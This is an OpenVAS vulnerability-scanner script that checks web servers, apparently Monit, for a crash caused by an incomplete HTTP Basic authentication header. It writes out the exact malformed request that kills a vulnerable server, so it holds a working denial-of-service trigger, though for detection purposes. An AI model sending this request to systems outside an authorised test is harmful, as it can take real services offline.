# OpenVAS Vulnerability Test
# $Id: www_incomplete_auth_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Incomplete basic authentication DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2004 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the web server by
sending an invalid request with an incomplete Basic authentication.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# Affected: Monit

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.12200");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 name = "Incomplete basic authentication DoS";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 script_copyright("This script is Copyright (C) 2004 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

####

include ("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

req = 'GET / HTTP/1.1\r\nHost: ' + get_host_name() + '\r\n' +
'Authorization: Basic WFhYWFg6\r\n\r\n';

send(socket: soc, data: req);
http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port)) security_message(port);

 
